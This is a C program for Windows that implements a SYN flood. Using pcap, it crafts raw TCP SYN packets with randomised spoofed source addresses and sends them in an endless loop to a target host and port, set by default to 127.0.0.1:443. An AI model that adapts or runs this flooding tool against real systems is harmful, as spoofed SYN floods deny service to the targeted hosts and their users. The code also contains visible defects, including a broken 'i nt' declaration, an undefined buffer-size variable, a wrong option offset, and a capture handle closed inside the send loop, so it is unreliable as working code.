#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <pcap.h>
#include <time.h>
#include "header_structure.h"
#include "sniff.h"
#include "raw_packet_constructor.h"
#define dest_ip "127.0.0.1"//目标ip   
#define default_buffer_size 1500
//windows系统不让发送原始tcp包，需要将发送函数调用pcap_sendpacket
void syn_flooding(char *dest_ip1, u_int dest_port, int buffer_size1){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldev;
    pcap_if_t *dev;
    pcap_if_t *allowdev;
    char err[PCAP_ERRBUF_SIZE];
    if(pcap_findalldevs(&alldev,err)==-1){
        printf("未获取网卡，错误信息 %s\n", err);
    }
    for(dev=alldev;dev!=NULL;dev=dev->next){
        printf("\n");
        printf("网卡名字:%s\n",dev->name);
        printf("网卡描述:%s\n",dev->description);
        if (dev->addresses != NULL && dev->addresses->addr != NULL) {
            // 只处理 IPv4 地址
            if (dev->addresses->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in *)dev->addresses->addr;
                char *ip = inet_ntoa(sin->sin_addr);
                printf("网卡地址: %s\n", ip);
                if(strcmp(ip,"127.0.0.1")==0){
                    allowdev=dev;
                }
            }
        } else {
              printf("网卡地址: (无地址)\n");
          }
    }
    char *name="\\Device\\NPF_Loopback";
    pcap_t *pt =pcap_open_live(name, default_buffer_size, 1, 1000, errbuf);
    
    
    if(pt==NULL){
        printf("打开网卡失败，错误信息 %s\n", err);
    }
    u_char buffer[buffer_size];
    //构建一个mac头部
    struct ethheader *eth=(struct ethheader *)buffer;
    //构造一个ip头部
    struct ipheader *ip=(struct ipheader *)(buffer+sizeof(struct ethheader));
    u_char *ip_opt=(u_char *)(buffer+sizeof(struct ipheader));
    i nt ip_opt_len=0;

    struct tcpheader *tcp=(struct tcpheader *)(buffer+sizeof(struct ethheader)+sizeof(struct ipheader)+ip_opt_len);
    u_char *tcp_opt=(u_char *)(buffer+sizeof(struct ipheader)+ip_opt_len+sizeof(struct tcpheader));
    int tcp_opt_len=0;
    

    srand(time(0));
    int flag=1;
    while(flag){
        memset(buffer,0,buffer_size);
        //填充以太网头部
        eth->ether_dhost[0] = 0xFF;
        eth->ether_dhost[1] = 0xFF;
        eth->ether_dhost[2] = 0xFF;
        eth->ether_dhost[3] = 0xFF;
        eth->ether_dhost[4] = 0xFF;
        eth->ether_dhost[5] = 0xFF;

        eth->ether_shost[0] = 0x00;
        eth->ether_shost[1] = 0x00;
        eth->ether_shost[2] = 0x00;
        eth->ether_shost[3] = 0x00;
        eth->ether_shost[4] = 0x00;
        eth->ether_shost[5] = 0x00;
        eth->ether_type=htons(0x0800);


        //填充ip头部
        ip->iph_ver=4;
        ip->iph_ihl=5;
        ip->iph_ttl=200;
        ip->iph_len=htons(sizeof(struct ipheader)+ip_opt_len+sizeof(struct tcpheader)+tcp_opt_len);
        ip->iph_protocol=IPPROTO_TCP;
        ip->iph_sourceip.s_addr=rand();
        ip->iph_destip.s_addr=inet_addr(dest_ip1);

        //填充tcp头部
        tcp->th_sport=htons(rand()%60000+1024);
        tcp->th_dport=htons(dest_port);
        tcp->th_seq=rand();
        tcp->Data_Offset=5;
        tcp->control_flags=2;//SYN
        tcp->th_win=htons(20000);
        tcp->th_sum=0;
        htonipheader(ip);
        htontcpheader(tcp);
        calculate_tcp_cheksum(ip,tcp,tcp_opt,tcp_opt_len,NULL,0);
        printf("检查校验和:%X\n",ntohs(tcp->th_sum));
        if(pcap_sendpacket(pt,buffer,default_buffer_size)==-1){
            printf("发送失败\n");
            fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(pt));

        }else{
            printf("发送成功\n");
        }
        for(int i=0;i<default_buffer_size;i++){
            printf("%02x ",buffer[i]);
        }
        pcap_close(pt);
    }
}

int main(){
    SetConsoleOutputCP(CP_UTF8);
    WSADATA wsaData;
    int result;

    // 初始化 Winsock
    result = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }
    syn_flooding(dest_ip, 443, default_buffer_size);
    WSACleanup();
    return 0;
}